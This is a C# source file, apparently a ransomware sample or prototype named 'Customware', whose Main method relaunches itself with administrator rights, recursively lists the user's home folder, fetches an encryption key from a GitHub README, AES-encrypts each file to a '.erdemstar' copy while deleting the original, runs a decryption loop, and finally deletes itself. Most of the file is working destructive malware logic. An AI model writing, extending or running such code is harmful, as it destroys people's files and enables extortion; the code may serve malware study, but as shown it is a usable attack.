using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace Customware
{
    class Program
    {
        static void isAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            bool isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);

            if (!isAdmin)
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.UseShellExecute = true;
                startInfo.WorkingDirectory = Environment.CurrentDirectory;
                startInfo.FileName = System.Reflection.Assembly.GetEntryAssembly().Location;
                startInfo.Verb = "runas";

                try
                {
                    Process.Start(startInfo);
                    //return true;
                }
                catch (System.ComponentModel.Win32Exception)
                {
                    //Console.WriteLine("Uygulama yeniden yönetici olarak çalıştırılamadı.");
                    //return false;
                }
            }
        }

        static void Main(string[] args)
        {

            isAdmin();

            #region File IO

            FileIO fileIO = new FileIO();

            var userHome = fileIO.getUserDirectory();

            if (userHome == null)
            {
                Environment.Exit(0);
            }

            var dirList = fileIO.recursiveDirectoryList(userHome);
            
            if (dirList is null)
            {
                var topList = fileIO.getTopFolders(userHome);
                dirList = fileIO.recursiveDirectoryListWithWhiteList(topList);

            }

            if (dirList == null)
            {
                Environment.Exit(0);
            }

            #endregion


            #region NetworkIO

            NetworkIO networkIO = new NetworkIO();
            var secret = networkIO.GetHttpResponse("https://raw.githubusercontent.com/Erdemstar/nodejs-todo/master/README.md");
            secret = secret.Replace("\n", "");
           
            if (secret is null)
            {
                secret = "erdemestar";
            }

            #endregion


            #region AesEncryptionIO

            AesFileEncryption aesFileEncryption = new AesFileEncryption();
            
            //enc
            foreach (var item in dirList)
            {
                if (!item.EndsWith(".erdemstar"))
                {
                    Console.WriteLine(item);
                    aesFileEncryption.EncryptFile(item, item + ".erdemstar", secret);
                    fileIO.deleteFile(item);
                }
            }

            //dec
            foreach (var item in dirList)
            {
                if (item.EndsWith(".erdemstar"))
                {
                    Console.WriteLine(item);
                    aesFileEncryption.DecryptFile(item, item.Replace(".erdemstar", ""), secret);
                    fileIO.deleteFile(item);
                }
            }
            


            #endregion


            fileIO.deleteItself();


        }

    }

}
